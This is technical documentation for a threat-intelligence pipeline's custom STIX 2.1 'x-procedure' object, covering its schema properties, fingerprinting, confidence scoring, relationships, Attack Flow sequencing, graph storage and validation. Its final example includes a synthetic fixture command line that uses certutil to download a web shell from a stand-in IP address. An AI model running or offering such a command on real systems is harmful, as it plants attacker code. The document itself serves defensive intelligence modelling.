# The `x-procedure` object

A deep dive for a STIX-literate reader who wants to consume, validate, or
extend the object this pipeline produces. The plain-language tour of the
pipeline is [HOW_IT_WORKS.md](HOW_IT_WORKS.md); the file-level reference is
[ARCHITECTURE.md](ARCHITECTURE.md). The schema itself is
[`backend/app/schemas/x_procedure_v3.json`](../backend/app/schemas/x_procedure_v3.json),
version `v0.5.0-draft`.

## Contents

1. [What it is and why it exists](#1-what-it-is-and-why-it-exists)
2. [The tuple](#2-the-tuple)
3. [Every property](#3-every-property)
4. [Instance, not template](#4-instance-not-template)
5. [Naming and description](#5-naming-and-description)
6. [Confidence](#6-confidence)
7. [Relationships](#7-relationships)
8. [Sequencing](#8-sequencing)
9. [Retired properties](#9-retired-properties)
10. [In the graph](#10-in-the-graph)
11. [Validating and consuming](#11-validating-and-consuming)
12. [Translating to Attack Flow](#12-translating-to-attack-flow)
13. [Known gaps](#13-known-gaps)
14. [A complete example](#14-a-complete-example)

## 1. What it is and why it exists

MITRE ATT&CK's `attack-pattern` says *what* adversaries do. T1059.001 says
they abuse PowerShell, which is true of thousands of unrelated intrusions and
is therefore too vague for actionability. What a defender needs
is *how*: the command line, the parent process, the platform, the tactic it
served, and a citation to the report that described it.

Most tooling models "procedure" as a relationship between an actor and a
technique. A relationship has no attributes of its own, so it cannot be
queried, versioned, compared across two vendors' accounts of the same thing,
or decomposed into the observables that constitute it. `x-procedure` makes
the procedure a first-class STIX 2.1 object with its own identity and its own
properties.

The definition the pipeline works from, shared by every stage that reasons
about procedures:

> A procedure is a discrete, repeatable technical implementation that
> integrates one or more techniques, often spanning multiple tactics, to
> fulfil a specific adversarial objective as an atomic event within an attack
> sequence.

Each clause changed the system's behaviour. *Repeatable* means a procedure is
a recipe, not a sighting. *Spanning multiple tactics* is normal, not an error:
"deploy and operate a remote-access tool" is command-and-control and
persistence at once, and earlier versions that forced one tactic per
procedure produced worse output. *A specific adversarial objective* is the
boundary rule: two objectives means two procedures, however adjacent the
prose. *Atomic* means irreducible.

Where it sits among neighbouring objects:

| Object | Relationship to `x-procedure` |
|---|---|
| `attack-pattern` (ATT&CK technique) | Above it. A procedure implements one or more techniques, referenced by `x_technique_refs` and a `uses` relationship. |
| `attack-action` (Attack Flow) | A step in a flow. `x-procedure` is a drop-in for it: the same `precedes` sequencing and the same operator and condition objects apply, but the procedure is the reusable intelligence object, not a node in one flow. |
| STIX Cyber Observables (`process`, `file`, `windows-registry-key`, …) | Below it. The components a procedure is made of, and the observables it touches. Indicators are not used; observables are. |
| Sigma and other detection rules | Downstream consumers. A rule describes how to catch a behaviour; a procedure describes the behaviour. Different lifecycle, different owner. |
| CACAO playbooks | An open question; not modelled. |

## 2. The tuple

A procedure is well-formed when three sets are non-empty:

```
P = { AP ≠ ∅,  LS ≠ ∅,  ⟨C⟩ ≠ ∅ }
```

| Element | Property | What it holds |
|---|---|---|
| **AP**, attack patterns | `x_technique_refs` | The ATT&CK techniques implemented. Resolved against the catalogue; an unresolvable technique is omitted, never fabricated. |
| **LS**, log sources | `x_log_source_refs` | Where a defender would see it. Derived from ATT&CK's own detection chain: technique → detection strategy → analytic → data component, read from the Neo4j catalogue, and emitted as `x-log-source` objects. |
| **⟨C⟩**, components | `x_components_refs` | The ordered observables that constitute the procedure: a `process` carrying the command line, the `file` it dropped, the registry key it wrote. Built from the command lines the source actually contains. |

That is also why `confidence` means something specific here: how completely
the procedure has been decomposed, not how strongly a model felt about it. An
incomplete component set is an epistemic condition, "we do not know yet",
rather than a defect in the object.

**What "non-empty" means in practice.** The tuple check (`tuple_semantics`
in the serializer) is graded, not absolute:

| Missing | Severity |
|---|---|
| AP | Error when `confidence ≥ 70`, warning below. A procedure that maps to no technique is not useful. |
| LS | Warning only when ATT&CK itself has no detection coverage for the procedure's techniques (common in Reconnaissance, Resource Development and Impact); error at `confidence ≥ 70` otherwise. |
| ⟨C⟩ | Always a warning. Many reports describe behaviour narratively with no command lines; missing components reflect the source, and `confidence` already carries the gap. |

On top of that, the bundle validator applies a stricter, non-negotiable
contract: `name`, `x_technique_refs` and `x_source_refs` must be non-empty on
every procedure or the bundle hard-fails. A procedure with no technique or no
source is a pipeline bug, not something an analyst can fix at a gate.

## 3. Every property

The schema declares 28 properties and `additionalProperties: false`, so
nothing else may appear on the object. `required` is the STIX envelope plus
`name`. The "written by" column says which pipeline stage produces the value.

**STIX envelope**

| Property | Type | Written by | Notes |
|---|---|---|---|
| `type` | const `x-procedure` | serializer | |
| `spec_version` | const `2.1` | serializer | |
| `id` | `x-procedure--<uuid>` | serializer | Always a fresh `uuid4`; see §4 |
| `created`, `modified` | date-time | serializer | Identical at creation |
| `revoked` | boolean, default false | never | |
| `created_by_ref` | `identity--…` | serializer | The source's author identity |
| `object_marking_refs` | `marking-definition--…[]` | never | See §13 |
| `external_references` | array | never | |
| `labels` | string[] | never | |
| `extensions` | object | serializer | Declares the x-procedure `extension-definition`, which the bundle embeds; see §11 |

**Core**

| Property | Type | Written by | Notes |
|---|---|---|---|
| `name` | string | drafting | `[Verb] [Object] via [Tool/Method]`; no actor names; §5 |
| `description` | string | drafting | Objective sentence first, then mechanism, then what a defender observes |
| `x_procedure_type` | string, open vocabulary | drafting | `reporting` (from a source's account) or `hypothetical` (the source speculates); the schema also suggests `observed` for internal incident data, which this pipeline never emits |
| `x_platforms` | string[], open vocabulary | drafting | This pipeline uses the OpenTide threat-surface vocabulary (`windows::server`, `container runtime::docker`); the schema suggests ATT&CK's platform names and permits either |
| `kill_chain_phases` | kill-chain-phase[] | serializer | `mitre-attack` phases derived from the techniques' tactics unless the draft carries its own |
| `confidence` | integer 0–100 | normalizer | The blend in §6 |
| `first_observed`, `last_observed` | date-time | drafting | Only when the source gives a date |

**The tuple**

| Property | Type | Written by | Notes |
|---|---|---|---|
| `x_technique_refs` | `attack-pattern--…[]` | serializer, from the technique-mapping stage | Dual-wired with a `uses` relationship; the ref is for portable filtering, the edge for graph traversal |
| `x_log_source_refs` | `x-log-source--…[]` | serializer, from the catalogue | Denormalised projection of the detection chain; the `detects` structure in the catalogue is authoritative |
| `x_components_refs` | SCO ids | serializer | One `process` per command line the source contains, with `image_ref` to the binary's `file` when that file is among the extracted entities |

**Provenance and chain membership**

| Property | Type | Written by | Notes |
|---|---|---|---|
| `x_source_refs` | `identity--…` or `report--…` [] | serializer | One entry per source; two procedures with the same name and different sources are independent observations |
| `x_source_provenance` | enum `prose`, `code`, `figure`, `paraphrased` | chunker → drafting | How much interpretation stood between the source and this object. `code` is verbatim from a fenced block; `figure` inherits a vision model's transcription risk; `paraphrased` means no verbatim anchor was found. Consumers should weigh the last two below the first two. |
| `x_vulnerability_refs` | `vulnerability--…[]` | serializer | Present when the procedure's core is exploitation of a specific flaw; dual-wired with `exploits` |
| `x_fingerprint` | string | normalizer | §4 |
| `x_chain_root` | boolean | chunker → drafting | `true` on the first procedure of each attack chain; **absent, not false**, elsewhere. The `attack-flow` object's `start_refs` are exactly these. |
| `x_chain_label` | string | chunker → drafting | Present only when one source describes more than one distinct intrusion ("SharePoint intrusion" vs "Veeam intrusion"), so they stay separable inside one bundle |

## 4. Instance, not template

Every `x-procedure` is a distinct observation. The same behaviour reported by
two vendors becomes two objects: same name, different ids, different
`x_source_refs`. There is no deterministic id minting anywhere in the
pipeline; every id is a fresh `uuid4`, so re-ingesting the same report
produces new objects rather than overwriting old ones. The pipeline never
destroys "who said this, and when" to save a row.

Deduplication is therefore a query-time question, and `x_fingerprint` is the
handle for it:

```
x_fingerprint = sha256( "|".join(sorted(x_technique_refs))
                        + "::" + "|".join(sorted(x_platforms))
                        + "::" + "|".join(sorted(mitre-attack phase names)) )[:32]
```

Order-independent, 128 bits, computed in one function
(`backend/app/utils/fingerprint.py`) that both the normalizer and the bundle
validator call, because drift between two implementations once made the
validator "correct" every fingerprint on every bundle. The schema does not
mandate this algorithm; it asks producers for something deterministic and
documents alternatives.

**Its limits, stated plainly.** The hash groups procedures that are
behaviourally identical by technique, platform and tactic. That is coarser
than it looks. Four real pairs from early runs collided while being things no
analyst would call the same:

- Exploit SharePoint via a CVE ↔ Exploit Veeam Backup via a different CVE
- Dump LSASS credentials via Mimikatz ↔ Dump LSASS memory via Task Manager
- Deploy one RAT via silent MSI install ↔ Deploy a different RAT the same way
- Terminate security processes via one tool ↔ Disable a specific AV product via another

Each is correct by the hash's own definition; the discriminator (which CVE,
which tool, which product) is not in it. Treat a fingerprint match as "worth
comparing", not "the same". A second tier that folds tools into the hash is
planned for when the collection is large enough to need it.

## 5. Naming and description

**Name.** `[Verb] [Object] via [Tool/Method]`, with an optional `for
[Purpose]` or `on [Platform]`. Examples the drafting prompt gives the model:

```
Download web shell via certutil
Execute Reconnaissance Commands via cmd.exe
Exploit Apache ActiveMQ via CVE-2023-46604
Deploy Cobalt Strike Beacon via DLL Sideloading
```

Three rules with reasons:

- **The verb is the adversary's, never the reporter's.** "Discuss", "Report",
  "Note", "Assess" describe what the vendor did. A hypothetical procedure is
  still named for the behaviour ("Exploit Netlogon Elevation of Privilege via
  CVE-2020-1472"), with the uncertainty carried by `x_procedure_type`, and
  never hedged in the name with "(Possible)" or "(Speculative)".
- **No actor names.** Attribution lives on graph edges. The moment an actor's
  name is in the string, the same behaviour from a different actor becomes a
  different object.
- **Same behaviour, same name.** The name describes the behaviour, not the
  observation, so two sources' accounts of one behaviour share a name and
  differ by id and source.

**Description.** Flowing prose in three parts, in order: the objective
sentence (copied verbatim from the technique-mapping stage's statement of the
procedure's objective, which is why the object needs no separate `objective`
property), the mechanism (tools, commands, sequence), and what a defender
monitoring the environment would observe.

## 6. Confidence

```
confidence = 0.30 × source reliability
           + 0.45 × behavioural confidence
           + 0.25 × context completeness
```

- **Source reliability** (0–100) is set by the analyst at upload: how far they
  trust the publisher.
- **Behavioural confidence** is the model's own confidence in the chunk the
  procedure came from, scaled to 0–100.
- **Context completeness** is an additive rubric over the draft: description
  length, presence of command lines, one or more techniques, an observation
  date, source references, platforms, and no flagged detail gap.

The weights sum to 1 and are constants in the normalizer. The result is an
integer clamped to 0–100. A procedure with a complete component set, every
technique mapped and log sources attached scores higher than one with a
partial decomposition, which is what the schema means by confidence
reflecting "the fidelity of the model's current representation".

## 7. Relationships

Every relationship is a STIX `relationship` object with `source_ref`,
`target_ref`, `relationship_type` and `created_by_ref`; none carries a
description or a confidence. Direction is source → target.

**Involving the procedure**

| Type | Direction | Notes |
|---|---|---|
| `uses` | x-procedure → attack-pattern | One per entry in `x_technique_refs` (dual-wired) |
| `uses` | x-procedure → malware, x-procedure → tool | Only the tools and malware the procedure itself used, never a source-wide fan-out |
| `uses` | intrusion-set → x-procedure | The actor is the subject |
| `has-observable` | x-procedure → SCO | What the procedure *touches*: a C2 domain, a registry key, a hash |
| `component-of` | SCO → x-procedure | What the procedure *is made of*; the one inverted direction |
| `exploits` | x-procedure → vulnerability | Dual-wired with `x_vulnerability_refs` |
| `precedes` | x-procedure → x-procedure, via operators and conditions | §8 |

**Actor and campaign level**

| Type | Direction |
|---|---|
| `attributed-to` | campaign → intrusion-set (skipped when only malware-as-a-service is present and the actor was inferred); intrusion-set → threat-actor |
| `targets` | intrusion-set / campaign → identity, location, software |
| `uses` | intrusion-set / campaign → tool, malware, attack-pattern (aggregated from the procedures attributed to that actor, so a contrast actor mentioned in passing inherits nothing) |
| `exploits` | intrusion-set / campaign → vulnerability |

**Embedded instead of an edge.** `x_log_source_refs`, `x_components_refs`,
`x_source_refs`, `created_by_ref` and `kill_chain_phases` are carried on the
object only. The graph mapping knows `derived-from`, `duplicate-of`,
`authored-by`, `belongs-to-tactic` and `indicates`, but the serializer emits
none of them today.

## 8. Sequencing

Order is never embedded on the procedure. It is expressed by `precedes`
relationships and three objects from the CTID Attack Flow 2.0.0 extension.
Attack Flow has one `extension-definition` for all of its types,
`extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4`; every
`attack-*` object declares it, and the bundle embeds the definition and
CTID's identity, exactly as CTID's own example bundle does.

| Object | Role |
|---|---|
| `attack-flow` | One per bundle. `start_refs` lists the chain roots (the procedures with `x_chain_root: true`), so a source that describes two intrusions yields one flow with two entry points. |
| `attack-operator` | `AND` or `OR`, inferred from the geometry of the chunk graph where it forks or rejoins, and `XOR` when an analyst marks a fork exclusive at the procedure gate. `XOR` is outside Attack Flow's own enum; see §12. |
| `attack-condition` | A runtime check the source describes ("if domain-joined, Kerberoast; otherwise NTLM relay"): `description`, `on_true_refs`, `on_false_refs`, optional `pattern`. A condition replaces the OR operator at the same fork. |

The routing rule: where procedure A branches, `A → operator → B, C`; where B
and C converge, `B, C → operator → D`; otherwise `A → B` directly. Procedures
removed at a gate are spliced out so the chain does not break around them.

None of this is emitted for a source judged **non-sequential**, a threat-actor
profile or a catalogue with no intrinsic order. That judgement is made at
entity extraction, leans towards "no" when unsure (a false "yes" invents
structure that looks real), and can be overridden per source. A non-sequential
bundle is a flat set of procedures, mirroring the source's shape.

## 9. Retired properties

These have been removed and must not come back. Each one duplicated
something better expressed elsewhere, or was never declared in the schema at
all.

| Property | What it was | Why it went | What replaced it |
|---|---|---|---|
| `x_command_lines` | Command strings inline on the procedure | String parsing was unreliable for tool extraction and fingerprinting | `process` SCOs in `x_components_refs`, carrying `command_line`, `image_ref` and `parent_ref` |
| `x_observable_refs` | Observables embedded on the procedure | Emitted but never declared in a schema with `additionalProperties: false`; every IoC-bearing bundle was silently invalid | `has-observable` relationships. Deliberately **not** merged into `x_components_refs`: components are what the procedure *is*, observables what it *touches*, and merging them would let a procedure with no commands pass the ⟨C⟩ check |
| `x_effect_refs` | Forward flow edges on the procedure | Duplicated `precedes` | `precedes` relationships |
| `x_flow_ref` | Back-pointer to the flow | The procedure is the intelligence object, not a flow node; membership is queryable from `start_refs` | `attack-flow.start_refs` |
| `x_command_ref` | The "primary" command | Redundant once components are ordered | The first entry of `x_components_refs` |
| `x_execution_start`, `x_execution_end` | Execution timestamps | No producer, no reader | `first_observed`, `last_observed` |
| `x_asset_refs` | Assets touched | Never had a producer, never in the schema | `targets` relationships from the actor |

## 10. In the graph

When `NEO4J_WRITES_ENABLED=true`, the distributor writes the procedure as a
node labelled `:Procedure:STIXObject`, keyed by `stix_id`.

- **Every node the pipeline writes carries `x_ingested_by = 'pipeline'`.**
  Catalogue nodes do not. That marker is the boundary the undo script relies
  on, and a `MERGE` only ever overwrites a node that carries it.
- **`uses` → attack-pattern is written as `IMPLEMENTS_TECHNIQUE`.** The
  catalogue already holds eighteen thousand `USES` edges, and the pipeline
  writes procedure → tool and procedure → malware under `USES` too. A
  technique-overlap query joins two procedures through a shared endpoint, so
  under `USES` "both used PsExec" would read as technique overlap. The bundle
  keeps the standard `uses`; only the graph edge is renamed.
- **Properties.** Every property except the STIX envelope keys becomes a node
  property. Lists of strings (`x_technique_refs`, `x_platforms`,
  `x_components_refs`, `x_source_refs`) are native arrays; `kill_chain_phases`
  is a list of objects and is stored as a JSON string, so match on
  `x_technique_refs` or on the `IMPLEMENTS_TECHNIQUE` edge, not on phases.
- **Provenance.** `(:Report)-[:DESCRIBES]->(object)` from the report's
  `object_refs`. That edge set is what `backend/scripts/undo_graph_source.py`
  deletes.

Three queries that work against the graph as written:

```cypher
// Technique -> the procedures that implement it, with the observables they touch
MATCH (t:AttackPattern {mitre_id: "T1059.001"})<-[:IMPLEMENTS_TECHNIQUE]-(p:Procedure)
OPTIONAL MATCH (p)-[:HAS_OBSERVABLE]->(o)
RETURN p.name, p.x_platforms, p.confidence, collect(o.value)

// Procedures that overlap on two or more techniques, grouped into clusters
MATCH (p1:Procedure)-[:IMPLEMENTS_TECHNIQUE]->(t)<-[:IMPLEMENTS_TECHNIQUE]-(p2:Procedure)
WHERE elementId(p1) < elementId(p2)
WITH p1, p2, apoc.coll.sort(collect(DISTINCT t.mitre_id)) AS shared
WHERE size(shared) >= 2
UNWIND [p1, p2] AS p
MATCH (r:Report)-[:DESCRIBES]->(p)
WITH shared, collect(DISTINCT p.name) AS procedures, collect(DISTINCT r.stix_id) AS reports
RETURN shared, size(procedures) AS n, size(reports) AS n_reports, procedures
ORDER BY n DESC

// Everything one report contributed
MATCH (r:Report {stix_id: $report_id})-[:DESCRIBES]->(n)
RETURN labels(n)[1] AS kind, count(*) ORDER BY count(*) DESC
```

## 11. Validating and consuming

**Inside the pipeline.** Every object in a bundle is validated against the
vendored OASIS STIX 2.1 JSON schemas for its type, and every `x-procedure`
against `x_procedure_v3.json`. Validation is all-or-nothing: a schema
violation, a dangling reference or a broken flow fails the run. The
`additionalProperties: false` rule is deliberate and has caught three real
bugs, each an undeclared property written by one layer that another layer
never knew about; a contract test now fails on any new undeclared property.

**As a consumer.** The schema's `$id` is
`https://netandneedle.com/stix/x-procedure-v3.schema.json`, a namespace, not a
URL that serves the file; take the schema from the repository. To validate a
bundle's procedures yourself:

```python
import json, jsonschema
schema = json.load(open("backend/app/schemas/x_procedure_v3.json"))
bundle = json.load(open("bundle.json"))
for obj in bundle["objects"]:
    if obj["type"] == "x-procedure":
        jsonschema.Draft202012Validator(schema).validate(obj)
```

**The extension declaration.** `x-procedure` is a STIX 2.1 extension in the
§7.3 sense, not a pre-2.1 custom object. Every procedure carries

```json
"extensions": {
  "extension-definition--b422519e-c47a-439d-9195-0f16b94fa889": { "extension_type": "new-sdo" }
}
```

and every bundle with a procedure embeds that `extension-definition` object
(`schema` points at `x_procedure_v3.json` in this repository, `version` is
`0.5.0-draft`) together with the identity it names as author. The same holds
for the Attack Flow objects and CTID's definition (§8). A consumer can
therefore resolve every `extensions` key in-bundle. The validator hard-fails
a procedure or Attack Flow object that omits its declaration, and any
declared definition the bundle does not contain.

A stock STIX 2.1 consumer will accept every standard object in the bundle and
should pass `x-procedure` and `x-log-source` through as declared extensions;
a consumer that ignores extension definitions and rejects unknown types will
drop them. Attack Flow objects are accepted by consumers that know the Attack
Flow specification, with the one exception noted in §12.

## 12. Translating to Attack Flow

Attack Flow 4.0 (the current release) still uses the STIX format published as
`attack-flow-schema-2.0.0.json`. An `x-procedure` is designed as a drop-in for
its `attack-action`, so a bundle from this pipeline converts to a
conformant Attack Flow with a mechanical pass:

| This bundle | Attack Flow 2.0.0 |
|---|---|
| `x-procedure` | `attack-action` with `name`, `description`, `confidence`; `technique_ref` ← the first of `x_technique_refs`, `technique_id` and `tactic_id` looked up in the ATT&CK catalogue; `command_ref` ← the Process SCO in `x_components_refs` |
| every `x_*` property | dropped (Attack Flow's schema forbids unevaluated properties) |
| `precedes` SRO `A → B` | append `B` to `A.effect_refs` (Attack Flow sequences by embedded refs, not relationships) |
| `attack-operator` `AND` / `OR` | unchanged |
| `attack-operator` `XOR` | `OR`; or an `attack-condition` with `on_true_refs` / `on_false_refs` when the source states the check, which is how Attack Flow expresses an exclusive fork |
| `attack-flow`, `attack-condition` | unchanged, including the `fb9c968a…` declaration |
| the x-procedure `extension-definition` and its author identity | dropped |

Validate the result with CTID's `attack-flow-schema-2.0.0.json`. No converter
ships yet; this table is the specification for one.

## 13. Known gaps

Stated so nobody rediscovers them.

1. **No marking.** No `marking-definition` is emitted and
   `object_marking_refs` is never set. The validator only allow-lists the
   standard TLP marking ids so bundles that carry them externally validate.
2. **`x_procedure_type: "observed"` has no producer.** The schema suggests
   it for internal incident data; the drafting stage emits only `reporting`
   and `hypothetical`.
3. **A fifth provenance value is described but not in the schema.** Internal
   state documents `hybrid` for a future multi-chunk procedure; emitting it
   today would fail validation.
4. **Draft mismatch in the schema file.** It declares `draft-07` but uses
   `$defs`, a 2019-09 keyword. It validates because the loader registers it
   as 2020-12; the declaration should be updated.
5. **`XOR` is outside Attack Flow's operator enum.** Attack Flow 2.0.0 allows
   `AND` and `OR` only and forbids extra properties on the operator, so an
   analyst-marked exclusive fork is valid here but not there. It is kept
   because it records the analyst's judgement; §12 gives the translation.

## 14. A complete example

Real serializer output from the synthetic three-draft fixture in
`tests/conftest.py`, so the example contains no vendor material. The
`attack-pattern` targets are external references, resolved against the
catalogue but not embedded in this small bundle. This procedure has a
component because the fixture supplies a command line; it has no
`precedes` edge because the fixture carries no chunk graph.

```json
{
  "type": "x-procedure",
  "spec_version": "2.1",
  "id": "x-procedure--5e04f60d-2ebe-4d3d-a5f4-2d1fff629516",
  "created": "2026-09-12T15:23:34.386Z",
  "modified": "2026-09-12T15:23:34.386Z",
  "name": "Download web shell via certutil",
  "description": "The actor used certutil.exe to download a web shell from the C2 server.",
  "created_by_ref": "identity--9f6a692e-95f9-4c5d-9815-f850e4ae19bc",
  "extensions": {
    "extension-definition--b422519e-c47a-439d-9195-0f16b94fa889": { "extension_type": "new-sdo" }
  },
  "x_technique_refs": [
    "attack-pattern--8d267313-c6e0-4b7b-811e-f96930c889ec",
    "attack-pattern--66f5262d-8372-4b9a-8f2c-435dddf23161"
  ],
  "kill_chain_phases": [
    { "kill_chain_name": "mitre-attack", "phase_name": "execution" },
    { "kill_chain_name": "mitre-attack", "phase_name": "command-and-control" }
  ],
  "x_platforms": ["windows::server"],
  "confidence": 78,
  "x_source_refs": ["identity--9f6a692e-95f9-4c5d-9815-f850e4ae19bc"],
  "x_procedure_type": "reporting",
  "x_source_provenance": "paraphrased",
  "x_fingerprint": "f152cefe0cd06a3a5e9c4770a5ada269",
  "x_components_refs": ["process--14cb5655-000c-409d-96e0-ba75c72fea54"]
}
```

Its component, built from the one command line in the fixture. `x_exe_name`
is the fallback when the binary is not among the extracted `file` entities;
otherwise `image_ref` points at that file.

```json
{
  "type": "process",
  "spec_version": "2.1",
  "id": "process--14cb5655-000c-409d-96e0-ba75c72fea54",
  "command_line": "certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp",
  "x_exe_name": "certutil.exe"
}
```

The relationships that name it, in the same bundle:

```
uses   x-procedure--5e04f60d…  ->  attack-pattern--8d267313…   (T1059.003, external)
uses   x-procedure--5e04f60d…  ->  attack-pattern--66f526…     (T1105, external)
uses   intrusion-set--228048f… ->  x-procedure--5e04f60d…      (the fixture's actor)
```

The extension definition the procedure declares, and its author, embedded
once in every bundle that contains a procedure. Both carry fixed timestamps:
a definition is a published artifact, not a per-run object.

```json
{
  "type": "extension-definition",
  "spec_version": "2.1",
  "id": "extension-definition--b422519e-c47a-439d-9195-0f16b94fa889",
  "created_by_ref": "identity--f431f809-377b-45e0-aa1c-6a4751cae5ff",
  "created": "2026-09-12T00:00:00.000Z",
  "modified": "2026-09-12T00:00:00.000Z",
  "name": "x-procedure",
  "description": "Defines the x-procedure SDO: a discrete, repeatable technical implementation of one or more ATT&CK techniques, formalized as the tuple P = {AP, LS, <C>} of attack patterns, log sources and ordered component observables. Every x-procedure is a unique observation; behaviourally equivalent procedures are grouped at query time by x_fingerprint, never merged at creation.",
  "schema": "https://raw.githubusercontent.com/netandneedle/procedure-extraction-pipeline/main/backend/app/schemas/x_procedure_v3.json",
  "version": "0.5.0-draft",
  "extension_types": ["new-sdo"],
  "external_references": [
    { "source_name": "procedure-extraction-pipeline", "description": "Reference implementation: the pipeline that emits this object", "url": "https://github.com/netandneedle/procedure-extraction-pipeline" },
    { "source_name": "x-procedure documentation", "description": "Every property, the fingerprint, relationships and sequencing", "url": "https://github.com/netandneedle/procedure-extraction-pipeline/blob/main/docs/X_PROCEDURE.md" }
  ]
}
{
  "type": "identity",
  "spec_version": "2.1",
  "id": "identity--f431f809-377b-45e0-aa1c-6a4751cae5ff",
  "created": "2026-02-09T00:00:00.000Z",
  "modified": "2026-09-12T00:00:00.000Z",
  "name": "Sherman Chu",
  "identity_class": "individual",
  "description": "Author of the x-procedure STIX 2.1 extension."
}
```

A bundle with a flow also embeds CTID's Attack Flow definition
(`extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4`, version
`2.0.0`) and CTID's identity, verbatim from their repository. Neither pair
appears in the Report's `object_refs`, is written to the graph, or is drawn in
the Explorer: they describe the object types, not the intrusion.

And the shape a sequenced bundle adds, from a run on the public-domain sample
advisory (identifiers abbreviated):

```json
{
  "type": "relationship",
  "spec_version": "2.1",
  "relationship_type": "precedes",
  "source_ref": "x-procedure--…",
  "target_ref": "attack-operator--…"
}
{
  "type": "attack-operator",
  "spec_version": "2.1",
  "id": "attack-operator--…",
  "operator": "OR",
  "effect_refs": ["x-procedure--…", "x-procedure--…"],
  "extensions": {
    "extension-definition--fb9c968a-745b-4ade-9b25-c324172197f4": { "extension_type": "new-sdo" }
  }
}
```
